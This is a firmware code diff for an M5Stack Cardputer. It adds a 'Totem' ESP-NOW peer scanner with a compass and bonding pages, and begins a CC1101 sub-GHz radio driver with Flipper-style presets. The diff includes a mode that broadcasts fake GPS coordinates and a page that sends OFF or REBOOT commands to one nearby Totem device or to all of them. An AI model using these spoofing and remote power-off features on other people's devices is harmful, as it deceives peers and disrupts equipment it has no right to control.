+        M5.Display.setCursor(10, 30); M5.Display.print("No GPS fix detected!");
+        M5.Display.setCursor(10, 50); M5.Display.print("Compass needs GPS for");
+        M5.Display.setCursor(10, 62); M5.Display.print("distance/bearing.");
+        M5.Display.setCursor(10, 82); M5.Display.print("Continuing as scanner...");
+        M5.Display.display(); delay(2000);
+        compass_mode = false;
+    }
+
+    // Spoofer coordinate input
+    float spoof_lat = 48.8566f, spoof_lon = 2.3522f;
+    if (spoof_mode) {
+        M5.Display.clear(TFT_BLACK);
+        M5.Display.setTextSize(1); M5.Display.setTextFont(1);
+        M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
+        M5.Display.setCursor(10, 10); M5.Display.print("Spoofer: enter coordinates");
+        M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
+        M5.Display.setCursor(10, 45); M5.Display.print("Latitude (48.8566):");
+        M5.Display.display();
+        String latStr = ""; unsigned long lk = 0; bool latDirty = true;
+        while (true) {
+            M5.update(); cardUpdate();
+            if (millis() - lk < 150) { delay(10); continue; }
+            if (kp(KEY_ENTER)) break;
+            if (kp(KEY_BACKSPACE) && latStr.length() > 0) { latStr.remove(latStr.length()-1); lk=millis(); latDirty=true; }
+            else { const char v[]= "-0123456789.";
+                for (int i=0; v[i]; i++) if (kp(v[i])) { latStr += v[i]; lk=millis(); latDirty=true; break; } }
+            if (latDirty) {
+                M5.Display.fillRect(10, 58, 220, 12, TFT_BLACK);
+                M5.Display.setTextColor(TFT_CYAN, TFT_BLACK); M5.Display.setCursor(10, 58);
+                M5.Display.print(latStr.length() > 0 ? latStr : "48.8566");
+                M5.Display.display(); latDirty = false;
+            }
+        }
+        if (latStr.length() > 0) spoof_lat = latStr.toFloat(); keyRelease();
+        M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
+        M5.Display.setCursor(10, 80); M5.Display.print("Longitude (2.3522):");
+        M5.Display.display();
+        String lonStr = ""; bool lonDirty = true;
+        while (true) {
+            M5.update(); cardUpdate();
+            if (millis() - lk < 150) { delay(10); continue; }
+            if (kp(KEY_ENTER)) break;
+            if (kp(KEY_BACKSPACE) && lonStr.length() > 0) { lonStr.remove(lonStr.length()-1); lk=millis(); lonDirty=true; }
+            else { const char v[]= "-0123456789.";
+                for (int i=0; v[i]; i++) if (kp(v[i])) { lonStr += v[i]; lk=millis(); lonDirty=true; break; } }
+            if (lonDirty) {
+                M5.Display.fillRect(10, 93, 220, 12, TFT_BLACK);
+                M5.Display.setTextColor(TFT_CYAN, TFT_BLACK); M5.Display.setCursor(10, 93);
+                M5.Display.print(lonStr.length() > 0 ? lonStr : "2.3522");
+                M5.Display.display(); lonDirty = false;
+            }
+        }
+        if (lonStr.length() > 0) spoof_lon = lonStr.toFloat(); keyRelease();
+    }
+
+    // (uses shared sprite from totemCompassMenu scope)
+    unsigned long last_draw = 0, last_tx = 0, last_mesh = 0;
+    TotemPage page = TPAGE_PEERS;
+    if (mode == 4) page = TPAGE_DEMIGOD;
+    if (mode == 5) page = TPAGE_PAIR_DIAG;
+    if (mode == 6) { page = TPAGE_CAPABILITIES; totem_send_cap_query(); }
+    int selected = 0;
+    int infoPeer = -1;
+    TotemDgState dg;
+
+    bool imu_available = M5.Imu.isEnabled();
+    bool imu_calibrated = false;
+    float imu_heading = 0;
+    unsigned long imu_last_us = micros();
+
+    // ═══════════════ MAIN LOOP ═══════════════
+    while (true) {
+        M5.update(); cardUpdate();
+        unsigned long now = millis();
+
+        // ── RX queue ──
+        TotemRxFrame rxf;
+        while (totem_rx_queue && xQueueReceive(totem_rx_queue, &rxf, 0) == pdTRUE)
+            totem_handle_rx(rxf);
+
+        // ── GPS ──
+        while (cardgps.available() > 0) gps.encode(cardgps.read());
+
+        // ── Build active peer order (sorted by RSSI) ──
+        int order[TOTEM_MAX_PEERS]; int oc = 0;
+        for (int i = 0; i < totem_peer_count; i++)
+            if (totem_peers[i].active) order[oc++] = i;
+        for (int i = 0; i < oc-1; i++)
+            for (int j = i+1; j < oc; j++)
+                if (totem_peers[order[j]].rssi > totem_peers[order[i]].rssi)
+                    { int t = order[i]; order[i] = order[j]; order[j] = t; }
+
+        // ── Key handling — BACK from any page → menu ──
+        if (kp(KEY_BACKSPACE)) {
+            keyRelease();
+            if (page == TPAGE_COMPASS) { page = TPAGE_INFO; }
+            else if (page == TPAGE_INFO) { page = TPAGE_PEERS; }
+            else {
+                break; // back to mode selection (sprite kept alive)
+            }
+        }
+
+        // ── Page-specific keys (each page has its own simple set) ──
+        if (page == TPAGE_PEERS || page == TPAGE_LOG) {
+            if (kp('.')) { keyRelease(); if (oc > 0) selected = min(selected + 1, oc - 1); }
+            if (kp(';')) { keyRelease(); selected = max(0, selected - 1); }
+            if (kp('s') || kp('S')) { keyRelease(); totem_sos = !totem_sos; }
+            if (kp('m') || kp('M')) { keyRelease();
+                float lat = gps.location.isValid() ? gps.location.lat() : 0;
+                float lon = gps.location.isValid() ? gps.location.lng() : 0;
+                totem_send_mesh(lat, lon);
+            }
+            if (kp('x') || kp('X')) { keyRelease();
+                for (int i = 0; i < totem_peer_count; i++)
+                    if (!totem_peers[i].bonded) totem_peers[i].active = false;
+            }
+            if (kp(KEY_ENTER) && page == TPAGE_PEERS && selected < oc) {
+                keyRelease(); infoPeer = order[selected]; page = TPAGE_INFO;
+            }
+        }
+        else if (page == TPAGE_INFO) {
+            if (kp('b') || kp('B')) { keyRelease();
+                if (infoPeer >= 0) { totem_peers[infoPeer].bonded = true;
+                    totem_add_espnow_peer(totem_peers[infoPeer].mac); totem_save_bonds(); }
+            }
+            if (kp('u') || kp('U')) { keyRelease();
+                if (infoPeer >= 0) { totem_peers[infoPeer].bonded = false; totem_save_bonds(); }
+            }
+            if (kp('c') || kp('C')) { keyRelease();
+                if (infoPeer >= 0) page = TPAGE_COMPASS;
+            }
+        }
+        else if (page == TPAGE_COMPASS) {
+            if (kp('n') || kp('N')) {
+                keyRelease();
+                if (imu_available) { imu_heading = 0; imu_calibrated = true; }
+            }
+        }
+        else if (page == TPAGE_DEMIGOD) {
+            if (kp('t') || kp('T')) { keyRelease(); dg.all = !dg.all; }
+            if (kp('c') || kp('C')) { keyRelease(); dg.color = (dg.color + 1) % 6; }
+            if (kp('f') || kp('F')) { keyRelease(); totem_send_dg_find(TOTEM_DG_FIND_SECS); }
+            if (kp('.')) { keyRelease(); if (oc > 0) selected = min(selected + 1, oc - 1);
+                if (selected < oc) { dg.hasPeer = true; memcpy(dg.peer, totem_peers[order[selected]].mac, 6); dg.all = false; }
+            }
+            if (kp(';')) { keyRelease(); selected = max(0, selected - 1);
+                if (selected < oc) { dg.hasPeer = true; memcpy(dg.peer, totem_peers[order[selected]].mac, 6); dg.all = false; }
+            }
+            if (kp('o') || kp('O') || kp('r') || kp('R')) {
+                char k = kp('o') || kp('O') ? 'o' : 'r';
+                keyRelease();
+                if (dg.pending == k && now < dg.pendingUntil) {
+                    totem_send_dg_power(k == 'o' ? 3 : 1);
+                    dg.pending = 0;
+                } else { dg.pending = k; dg.pendingUntil = now + 5000; }
+            }
+        }
+        else if (page == TPAGE_PAIR_DIAG) {
+            if (kp('.')) { keyRelease(); if (oc > 0) selected = min(selected + 1, oc - 1); }
+            if (kp(';')) { keyRelease(); selected = max(0, selected - 1); }
+            if (kp('p') || kp('P')) { keyRelease();
+                totem_pair_until = now + TOTEM_PAIR_SECS * 1000;
+                totem_bond_latched = false;
+            }
+            if (kp('b') || kp('B')) { keyRelease();
+                if (selected < oc) { int idx = order[selected]; totem_peers[idx].bonded = true;
+                    totem_add_espnow_peer(totem_peers[idx].mac); totem_save_bonds(); }
+            }
+            if (kp('u') || kp('U')) { keyRelease();
+                if (selected < oc) { totem_peers[order[selected]].bonded = false; totem_save_bonds(); }
+            }
+        }
+        else if (page == TPAGE_CAPABILITIES) {
+            if (kp(KEY_ENTER)) { keyRelease(); totem_send_cap_query(); }
+        }
+
+        // ── TX ──
+        bool pairing = (now < totem_pair_until);
+        unsigned long tx_interval = pairing ? (50 + (esp_random() % 51)) : TOTEM_TX_INTERVAL;
+        if (now - last_tx >= tx_interval) {
+            last_tx = now;
+            if (pairing) {
+                if (totem_bond_latched) totem_send_pair_beacon(totem_bond_mac, true);
+                else totem_send_pair_beacon(TOTEM_BCAST, false);
+            } else if (spoof_mode) {
+                totem_send_position(spoof_lat, spoof_lon);
+            } else {
+                float lat = gps.location.isValid() ? gps.location.lat() : 0;
+                float lon = gps.location.isValid() ? gps.location.lng() : 0;
+                totem_send_position(lat, lon);
+            }
+        }
+        if (TOTEM_MESH_TX_MS > 0 && now - last_mesh >= TOTEM_MESH_TX_MS) {
+            last_mesh = now;
+            float lat = gps.location.isValid() ? gps.location.lat() : 0;
+            float lon = gps.location.isValid() ? gps.location.lng() : 0;
+            totem_send_mesh(lat, lon);
+        }
+
+        // Expire pair latch + old peers
+        if (totem_bond_latched && now >= totem_pair_until) totem_bond_latched = false;
+        if (totem_group_until && now >= totem_group_until) { totem_group_uid = 0; totem_group_until = 0; }
+        for (int i = 0; i < totem_peer_count; i++)
+            if (totem_peers[i].active && now - totem_peers[i].last_seen > TOTEM_PEER_TIMEOUT)
+                totem_peers[i].active = false;
+
+        // IMU gyro integration for heading tracking
+        if (imu_available && imu_calibrated) {
+            unsigned long now_us = micros();
+            float dt = (now_us - imu_last_us) / 1000000.0f;
+            imu_last_us = now_us;
+            if (dt > 0 && dt < 0.5f) {
+                float gx, gy, gz;
+                if (M5.Imu.getGyro(&gx, &gy, &gz)) {
+                    imu_heading += gz * dt;
+                    imu_heading = fmodf(imu_heading + 360.0f, 360.0f);
+                }
+            }
+        } else {
+            imu_last_us = micros();
+        }
+
+        // Flash on Find
+        if (millis() < totem_flash_until) {
+            sp.fillScreen(totem_flash_color);
+            if (use_sprite) sprite->pushSprite(0, 0);
+            delay(50); continue;
+        }
+        if (now - last_draw < 200) { delay(5); continue; }
+        last_draw = now;
+
+        // ═══════════════ DRAW ═══════════════
+        sp.fillScreen(TFT_BLACK);
+        sp.setTextSize(1); sp.setTextFont(1);
+        uint16_t good = sp.color565(90, 255, 130);
+        uint16_t warn = sp.color565(255, 80, 80);
+
+        // ── Header (all pages) ──
+        String state = pairing ? (totem_bond_latched ? "PAIR>" : "PAIR.") :
+                       (totem_group_until ? "GRP" : "idle");
+        sp.fillRect(0, 0, W, 13, 0x0841);
+        sp.setTextColor(totem_sos ? warn : (pairing ? good : 0xFC00));
+        sp.setCursor(2, 3);
+        sp.printf("TOTEM %s [%d] %s%s", state.c_str(), oc,
+                  gps.location.isValid() ? "GPS " : "",
+                  totem_sos ? "SOS" : "");
+        sp.drawFastHLine(0, 13, W, 0x03E0);
+
+        // ── Stats row ──
+        sp.setTextColor(TFT_DARKGREEN); sp.setCursor(2, 15);
+        sp.printf("rx%lu b%lu p%lu r%lu", totem_stats.rx, totem_stats.bonds,
+                  totem_stats.pairRx, totem_stats.relayed);
+
+        int y = 26;
+
+        // ═══ PAGE: PEERS ═══
+        if (page == TPAGE_PEERS) {
+            int top = max(0, selected - 7);
+            for (int oi = top; oi < oc && y < H - 14; oi++) {
+                TotemPeer& p = totem_peers[order[oi]];
+                bool sel = (oi == selected);
+                int rowH = (p.lat != 0 || p.lon != 0) ? 20 : 10;
+                if (sel) sp.fillRect(0, y, W, rowH, TFT_NAVY);
+                uint16_t fg = sel ? TFT_GREEN : (p.sos ? warn : (p.bonded ? good : TFT_WHITE));
+                sp.setTextColor(fg); sp.setCursor(2, y);
+                char ms[10]; snprintf(ms, 10, "%02x:%02x:%02x", p.mac[3], p.mac[4], p.mac[5]);
+                sp.printf("%s %4d %s", ms, p.rssi, p.name[0] ? p.name : "?");
+                y += 10;
+                if (y < H - 14 && (p.lat != 0 || p.lon != 0)) {
+                    sp.setTextColor(sel ? TFT_CYAN : TFT_DARKGREEN); sp.setCursor(4, y);
+                    if (p.distance > 0 && gps.location.isValid()) {
+                        if (p.distance >= 1000) sp.printf("%.1fkm %s", p.distance / 1000.0f, totem_dir_str(p.bearing));
+                        else sp.printf("%.0fm %s", p.distance, totem_dir_str(p.bearing));
+                    }
+                    else sp.printf("%.4f,%.4f", p.lat, p.lon);
+                    y += 10;
+                }
+            }
+            if (oc == 0) {
+                sp.setTextColor(TFT_YELLOW);
+                sp.setCursor(10, 55); sp.print("Waiting for Totem devices...");
+            }
+            sp.fillRect(0, H-14, W, 14, 0x0841);
+            sp.setTextColor(0x5AEB); sp.setCursor(2, H-11);
+            sp.print(";/. sel ENTER=info s=SOS x=clr");
+        }
+
+        // ═══ PAGE: INFO ═══
+        else if (page == TPAGE_INFO && infoPeer >= 0 && infoPeer < totem_peer_count) {
+            TotemPeer& p = totem_peers[infoPeer];
+            char ms[18]; snprintf(ms, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
+                p.mac[0],p.mac[1],p.mac[2],p.mac[3],p.mac[4],p.mac[5]);
+            sp.setTextColor(good);
+            sp.setCursor(2, y); sp.printf("MAC  %s", ms); y += 11;
+            sp.setCursor(2, y); sp.printf("Name %s", p.name[0] ? p.name : "--"); y += 11;
+            sp.setTextColor(TFT_WHITE);
+            sp.setCursor(2, y); sp.printf("RSSI %d  Cat %d", p.rssi, p.cat); y += 11;
+            sp.setCursor(2, y); sp.printf("Lat  %.5f", p.lat); y += 11;
+            sp.setCursor(2, y); sp.printf("Lon  %.5f", p.lon); y += 11;
+            sp.setCursor(2, y); sp.printf("Hops %d  SOS %s", p.hops, p.sos ? "YES" : "no"); y += 11;
+            sp.setCursor(2, y); sp.printf("Bond %s  Seen %lus",
+                p.bonded ? "YES" : "no", (millis() - p.last_seen) / 1000); y += 11;
+            sp.setCursor(2, y);
+            if (p.distance >= 1000) sp.printf("Dist %.1fkm %s", p.distance / 1000.0f, p.distance > 0 ? totem_dir_str(p.bearing) : "--");
+            else sp.printf("Dist %.0fm %s", p.distance, p.distance > 0 ? totem_dir_str(p.bearing) : "--");
+            sp.fillRect(0, H-14, W, 14, 0x0841);
+            sp.setTextColor(0x5AEB); sp.setCursor(2, H-11);
+            sp.print("b=bond u=unbond c=compass BACK");
+        }
+
+        // ═══ PAGE: COMPASS ═══
+        else if (page == TPAGE_COMPASS && infoPeer >= 0 && infoPeer < totem_peer_count) {
+            TotemPeer& p = totem_peers[infoPeer];
+            float myLat = gps.location.isValid() ? gps.location.lat() : 0;
+            float myLon = gps.location.isValid() ? gps.location.lng() : 0;
+            bool hasPos = (myLat != 0 || myLon != 0) && (p.lat != 0 || p.lon != 0);
+            float bearing = hasPos ? totem_get_azimuth(myLat, myLon, p.lat, p.lon) : 0;
+            float dist = hasPos ? totem_get_distance(myLat, myLon, p.lat, p.lon) : 0;
+
+            float devHeading = 0;
+            bool hasHeading = false;
+            if (imu_available && imu_calibrated) {
+                devHeading = imu_heading;
+                hasHeading = true;
+            } else if (gps.course.isValid() && gps.speed.kmph() > 3.0) {
+                devHeading = gps.course.deg();
+                hasHeading = true;
+            }
+
+            float arrowAngle = hasPos ? (bearing - devHeading) : 0;
+            float rad = arrowAngle * 0.017453292f;
+
+            // Compass circle
+            int cx = W / 2, cy = 52;
+            int cr = 38;
+            sp.drawCircle(cx, cy, cr, TFT_DARKGREEN);
+            sp.drawCircle(cx, cy, cr - 1, TFT_DARKGREEN);
+
+            // Cardinal points
+            sp.setTextColor(TFT_DARKGREEN);
+            sp.setCursor(cx - 2, cy - cr - 9); sp.print("N");
+            sp.setCursor(cx - 2, cy + cr + 2); sp.print("S");
+            sp.setCursor(cx + cr + 3, cy - 3); sp.print("E");
+            sp.setCursor(cx - cr - 9, cy - 3); sp.print("W");
+
+            if (hasPos) {
+                // Arrow pointing toward target
+                int ax = cx + (int)(sinf(rad) * (cr - 6));
+                int ay = cy - (int)(cosf(rad) * (cr - 6));
+                int bx = cx + (int)(sinf(rad - 2.8f) * 10);
+                int by = cy - (int)(cosf(rad - 2.8f) * 10);
+                int dx = cx + (int)(sinf(rad + 2.8f) * 10);
+                int dy = cy - (int)(cosf(rad + 2.8f) * 10);
+                sp.fillTriangle(ax, ay, bx, by, dx, dy, TFT_GREEN);
+                // Small dot at center
+                sp.fillCircle(cx, cy, 2, TFT_WHITE);
+            } else {
+                sp.setTextColor(TFT_YELLOW);
+                sp.setCursor(cx - 20, cy - 3); sp.print("No GPS");
+            }
+
+            // Peer info - right side / top
+            char ms[10]; snprintf(ms, 10, "%02x:%02x:%02x", p.mac[3], p.mac[4], p.mac[5]);
+            sp.setTextColor(TFT_GREEN);
+            sp.setCursor(2, y); sp.printf("%s %s", ms, p.name[0] ? p.name : "?"); y += 10;
+
+            // Distance + bearing text at bottom right
+            sp.setTextColor(TFT_CYAN);
+            if (hasPos) {
+                sp.setCursor(2, 96);
+                if (dist >= 1000) sp.printf("%.1fkm  %s  %.0f", dist / 1000.0f, totem_dir_str(bearing), bearing);
+                else sp.printf("%.0fm  %s  %.0f", dist, totem_dir_str(bearing), bearing);
+            }
+
+            // Heading source indicator
+            sp.setTextColor(TFT_DARKGREEN);
+            sp.setCursor(2, 108);
+            if (imu_available && imu_calibrated) sp.printf("IMU:%.0f", devHeading);
+            else if (hasHeading) sp.printf("GPS:%.0f", devHeading);
+            else if (imu_available) sp.print("IMU: press N=calib");
+            else sp.print("No IMU - move for GPS hdg");
+
+            sp.fillRect(0, H - 14, W, 14, 0x0841);
+            sp.setTextColor(0x5AEB); sp.setCursor(2, H - 11);
+            sp.print("n=calibrate(North) BACK=info");
+        }
+
+        // ═══ PAGE: DEMIGOD ═══
+        else if (page == TPAGE_DEMIGOD) {
+            const uint8_t* c = TOTEM_DG_COLORS[dg.color];
+            String tgt = dg.all ? "ALL (broadcast)" : (dg.hasPeer ?
+                String("peer ") + String(dg.peer[4],HEX) + ":" + String(dg.peer[5],HEX) : "ALL");
+            sp.setTextColor(good);
+            sp.setCursor(2, y); sp.print("-- DEMI-GOD --"); y += 12;
+            sp.setTextColor(dg.all ? warn : good);
+            sp.setCursor(2, y); sp.printf("Target: %s", tgt.c_str()); y += 12;
+            sp.setTextColor(TFT_WHITE);
+            sp.setCursor(2, y); sp.printf("Colour: (%d,%d,%d)", c[0], c[1], c[2]); y += 14;
+            sp.setTextColor(TFT_CYAN);
+            sp.setCursor(2, y); sp.print("t=target c=colour"); y += 11;
+            sp.setCursor(2, y); sp.print("f=FIND  o=OFF  r=REBOOT"); y += 11;
+            if (dg.pending) {
+                sp.setTextColor(warn);
+                sp.setCursor(2, y); sp.printf("CONFIRM: press %c again!", dg.pending);
+            }
+            sp.fillRect(0, H-14, W, 14, 0x0841);
+            sp.setTextColor(0x5AEB); sp.setCursor(2, H-11);
+            sp.print(";/.=tgt t=ALL f o r BACK=menu");
+        }
+
+        // ═══ PAGE: LOG ═══
+        else if (page == TPAGE_LOG) {
+            sp.setTextColor(good);
+            sp.setCursor(2, y); sp.print("-- RADIO LOG --"); y += 12;
+            for (int oi = 0; oi < oc && y < H - 14; oi++) {
+                TotemPeer& p = totem_peers[order[oi]];
+                sp.setTextColor(TFT_WHITE); sp.setCursor(2, y);
+                sp.printf("%02x:%02x:%02x %4d cat%d %s",
+                    p.mac[3], p.mac[4], p.mac[5], p.rssi, p.cat,
+                    p.name[0] ? p.name : "?");
+                y += 10;
+            }
+            sp.fillRect(0, H-14, W, 14, 0x0841);
+            sp.setTextColor(0x5AEB); sp.setCursor(2, H-11);
+            sp.print(";/.=scroll x=clear BACK=menu");
+        }
+
+        // ═══ PAGE: PAIR MANAGER ═══
+        else if (page == TPAGE_PAIR_DIAG) {
+            sp.setTextColor(good);
+            sp.setCursor(2, y); sp.print("-- PAIR MANAGER --"); y += 11;
+            sp.setTextColor(TFT_WHITE);
+            sp.setCursor(2, y); sp.printf("State: %s  Bonds: %lu",
+                pairing ? (totem_bond_latched ? "LATCHED" : "ARMED") : "idle",
+                totem_stats.bonds); y += 11;
+            for (int oi = 0; oi < oc && y < H - 14; oi++) {
+                TotemPeer& p = totem_peers[order[oi]];
+                bool sel = (oi == selected);
+                if (sel) sp.fillRect(0, y, W, 10, TFT_NAVY);
+                uint16_t fg = sel ? TFT_GREEN : (p.bonded ? good : TFT_WHITE);
+                sp.setTextColor(fg); sp.setCursor(2, y);
+                sp.printf("%s %02x:%02x:%02x %4d %s",
+                    p.bonded ? "[B]" : "[ ]",
+                    p.mac[3], p.mac[4], p.mac[5], p.rssi,
+                    p.name[0] ? p.name : "?");
+                y += 10;
+            }
+            sp.fillRect(0, H-14, W, 14, 0x0841);
+            sp.setTextColor(0x5AEB); sp.setCursor(2, H-11);
+            sp.print(";/. b=bond u=unbond p=pair");
+        }
+
+        // ═══ PAGE: CAPABILITIES ═══
+        else if (page == TPAGE_CAPABILITIES) {
+            sp.setTextColor(good);
+            sp.setCursor(2, y); sp.print("-- CAPABILITIES --"); y += 12;
+            for (int oi = 0; oi < oc && y < H - 14; oi++) {
+                TotemPeer& p = totem_peers[order[oi]];
+                sp.setTextColor(TFT_WHITE); sp.setCursor(2, y);
+                sp.printf("%02x:%02x v%d.%d.%d B%d%%",
+                    p.mac[4], p.mac[5], p.cat, 0, 0,
+                    100); // battery not extracted yet
+                y += 10;
+            }
+            sp.fillRect(0, H-14, W, 14, 0x0841);
+            sp.setTextColor(0x5AEB); sp.setCursor(2, H-11);
+            sp.print("ENTER=refresh  BACK=menu");
+        }
+
+        // ═══ PAGE: BLE STATUS ═══
+        else if (page == TPAGE_BLE_STATUS) {
+            sp.setTextColor(good);
+            sp.setCursor(2, y); sp.print("-- BLE APP STATUS --"); y += 12;
+            sp.setTextColor(TFT_WHITE);
+            sp.setCursor(2, y); sp.printf("BLE: %s", totem_ble_active ? "ACTIVE" : "OFF"); y += 11;
+            sp.setCursor(2, y); sp.printf("App: %s", totem_ble_connected ? "CONNECTED" : "waiting..."); y += 11;
+            sp.setCursor(2, y); sp.printf("Name: \"Totem\""); y += 11;
+            sp.setCursor(2, y); sp.printf("Schema: %d  Mode: %d", totem_ble_frame_schema, totem_ble_conn_mode); y += 11;
+            sp.setTextColor(TFT_DARKGREEN);
+            sp.setCursor(2, y); sp.printf("Peers synced: %d bonded", (int)totem_ble_last_peer_sync); y += 11;
+            sp.setCursor(2, y); sp.printf("MAC: %02X:%02X:%02X:%02X:%02X:%02X",
+                totem_my_mac[0], totem_my_mac[1], totem_my_mac[2],
+                totem_my_mac[3], totem_my_mac[4], totem_my_mac[5]); y += 11;
+            sp.setTextColor(TFT_CYAN);
+            sp.setCursor(2, y); sp.print("UUID: 7913b588-0000-...");
+            sp.fillRect(0, H-14, W, 14, 0x0841);
+            sp.setTextColor(0x5AEB); sp.setCursor(2, H-11);
+            sp.print("BACK=menu");
+        }
+
+        if (use_sprite) sprite->pushSprite(0, 0);
+    }
+    } // outer loop (mode selection)
+
+totem_cleanup:
+    if (sprite) { sprite->deleteSprite(); delete sprite; sprite = nullptr; }
+    totem_save_bonds();
+    totem_running = false;
+    esp_wifi_set_promiscuous(false);
+    esp_now_unregister_recv_cb();
+    esp_now_deinit();
+    if (totem_rx_queue) { vQueueDelete(totem_rx_queue); totem_rx_queue = nullptr; }
+    esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
+    WiFi.mode(WIFI_OFF);
+    delay(50);
+    M5.Display.clear(menuBackgroundColor);
+    inMenu = true;
+}
+
+// ========================= SUB-GHZ CC1101 ============================
+// =====================================================================
+// CC1101 Sub-GHz transceiver + Flipper-style protocol decoders + UI
+// Ported from Momentum Flipper firmware (C) + Raspyjack Python
+// Hardware: M5Stack Cap CC1101 HAT on Cardputer ADV
+// =====================================================================
+
+#include <SPI.h>
+
+// CC1101 Cap HAT pins (Cardputer ADV)
+#define CC_CS    5
+#define CC_MOSI  14
+#define CC_MISO  39
+#define CC_SCLK  40
+#define CC_GDO0  15
+#define CC_RFSW0 13
+
+// CC1101 SPI strobes
+#define CC_SRES  0x30
+#define CC_SRX   0x34
+#define CC_STX   0x35
+#define CC_SIDLE 0x36
+#define CC_SFRX  0x3A
+#define CC_SFTX  0x3B
+
+// CC1101 status registers
+#define CC_RSSI      0x34
+#define CC_MARCSTATE 0x35
+#define CC_RXBYTES   0x3B
+#define CC_TXBYTES   0x3A
+#define CC_VERSION   0x31
+
+// CC1101 config registers
+#define CC_IOCFG2    0x00
+#define CC_IOCFG0    0x02
+#define CC_FIFOTHR   0x03
+#define CC_PKTLEN    0x06
+#define CC_PKTCTRL1  0x07
+#define CC_PKTCTRL0  0x08
+#define CC_FSCTRL1   0x0B
+#define CC_FREQ2     0x0D
+#define CC_FREQ1     0x0E
+#define CC_FREQ0     0x0F
+#define CC_MDMCFG4   0x10
+#define CC_MDMCFG3   0x11
+#define CC_MDMCFG2   0x12
+#define CC_MDMCFG1   0x13
+#define CC_MDMCFG0   0x14
+#define CC_DEVIATN   0x15
+#define CC_MCSM1     0x17
+#define CC_MCSM0     0x18
+#define CC_FOCCFG    0x19
+#define CC_BSCFG     0x1A
+#define CC_AGCCTRL2  0x1B
+#define CC_AGCCTRL1  0x1C
+#define CC_AGCCTRL0  0x1D
+#define CC_FREND1    0x21
+#define CC_FREND0    0x22
+#define CC_FSCAL3    0x23
+#define CC_FSCAL2    0x24
+#define CC_FSCAL1    0x25
+#define CC_FSCAL0    0x26
+#define CC_TEST2     0x2C
+#define CC_TEST1     0x2D
+#define CC_TEST0     0x2E
+#define CC_FIFO      0x3F
+#define CC_PA_TABLE  0x3E
+
+#define CC_FOSC 26000000UL
+
+// ── SPI driver ──
+
+SPIClass* cc_spi = &SPI;
+bool cc_opened = false;
+float cc_freq_mhz = 433.92f;
+
+void cc_spi_begin() {
+    cc_spi->beginTransaction(SPISettings(500000, MSBFIRST, SPI_MODE0));
+    digitalWrite(CC_CS, LOW);
+}
+void cc_spi_end() {
+    digitalWrite(CC_CS, HIGH);
+    cc_spi->endTransaction();
+}
+
+uint8_t cc_strobe(uint8_t cmd) {
+    cc_spi_begin();
+    uint8_t r = cc_spi->transfer(cmd);
+    cc_spi_end();
+    return r;
+}
+
+void cc_write_reg(uint8_t addr, uint8_t val) {
+    cc_spi_begin();
+    cc_spi->transfer(addr);
+    cc_spi->transfer(val);
+    cc_spi_end();
+}
+
+uint8_t cc_read_reg(uint8_t addr) {
+    cc_spi_begin();
+    cc_spi->transfer(addr | 0x80);
+    uint8_t r = cc_spi->transfer(0x00);
+    cc_spi_end();
+    return r;
+}
+
+uint8_t cc_read_status(uint8_t addr) {
+    cc_spi_begin();
+    cc_spi->transfer(addr | 0xC0);
+    uint8_t r = cc_spi->transfer(0x00);
+    cc_spi_end();
+    return r;
+}
+
+void cc_write_burst(uint8_t addr, const uint8_t* data, int len) {
+    cc_spi_begin();
+    cc_spi->transfer(addr | 0x40);
+    for (int i = 0; i < len; i++) cc_spi->transfer(data[i]);
+    cc_spi_end();
+}
+
+void cc_read_burst(uint8_t addr, uint8_t* buf, int len) {
+    cc_spi_begin();
+    cc_spi->transfer(addr | 0xC0);
+    for (int i = 0; i < len; i++) buf[i] = cc_spi->transfer(0x00);
+    cc_spi_end();
+}
+
+// ── Presets (Flipper-compatible register configs) ──
+
+struct CCPresetPatch { uint8_t addr; uint8_t val; };
+
+struct CCPreset {
+    const char* name;
+    const char* sub_name;
+    bool is_ook;
+    const CCPresetPatch* patches;
+    uint8_t patch_count;
+    uint8_t pa_table[8];
+};
+
+const CCPresetPatch AM650_patches[] = {
+    {0x02,0x0D},{0x03,0x07},{0x08,0x32},{0x0B,0x06},
+    {0x10,0x17},{0x11,0x32},{0x12,0x30},{0x13,0x00},{0x14,0x00},
+    {0x18,0x18},{0x19,0x18},{0x1B,0x07},{0x1C,0x00},{0x1D,0x91},
+    {0x20,0xFB},{0x21,0xB6},{0x22,0x11},
+    {0x2C,0x81},{0x2D,0x35},{0x2E,0x09},
+};
+const CCPresetPatch AM270_patches[] = {
+    {0x02,0x0D},{0x03,0x47},{0x08,0x32},{0x0B,0x06},
+    {0x10,0x67},{0x11,0x32},{0x12,0x30},{0x13,0x00},{0x14,0x00},
+    {0x18,0x18},{0x19,0x18},{0x1B,0x03},{0x1C,0x00},{0x1D,0x40},
+    {0x20,0xFB},{0x21,0xB6},{0x22,0x11},
+    {0x2C,0x81},{0x2D,0x35},{0x2E,0x09},
+};
+const CCPresetPatch FM238_patches[] = {
+    {0x02,0x0D},{0x07,0x04},{0x08,0x32},{0x0B,0x06},
+    {0x10,0x67},{0x11,0x83},{0x12,0x04},{0x13,0x02},{0x14,0x00},
+    {0x15,0x04},{0x18,0x18},{0x19,0x16},
+    {0x1B,0x07},{0x1C,0x00},{0x1D,0x91},
+    {0x20,0xFB},{0x21,0x56},{0x22,0x10},
+    {0x2C,0x81},{0x2D,0x35},{0x2E,0x09},
+};
+const CCPresetPatch FM476_patches[] = {
+    {0x02,0x0D},{0x07,0x04},{0x08,0x32},{0x0B,0x06},
+    {0x10,0x67},{0x11,0x83},{0x12,0x04},{0x13,0x02},{0x14,0x00},
+    {0x15,0x47},{0x18,0x18},{0x19,0x16},
+    {0x1B,0x07},{0x1C,0x00},{0x1D,0x91},
+    {0x20,0xFB},{0x21,0x56},{0x22,0x10},
+    {0x2C,0x81},{0x2D,0x35},{0x2E,0x09},
+};
+
+CCPreset cc_presets[] = {
+    {"AM650", "OOK650Async", true,  AM650_patches, 20, {0x00,0xC0,0,0,0,0,0,0}},
+    {"AM270", "OOK270Async", true,  AM270_patches, 20, {0x00,0xC0,0,0,0,0,0,0}},
+    {"FM238", "2FSKDev238Async", false, FM238_patches, 21, {0xC0,0,0,0,0,0,0,0}},
+    {"FM476", "2FSKDev476Async", false, FM476_patches, 21, {0xC0,0,0,0,0,0,0,0}},
+};
+int cc_preset_idx = 0;
+
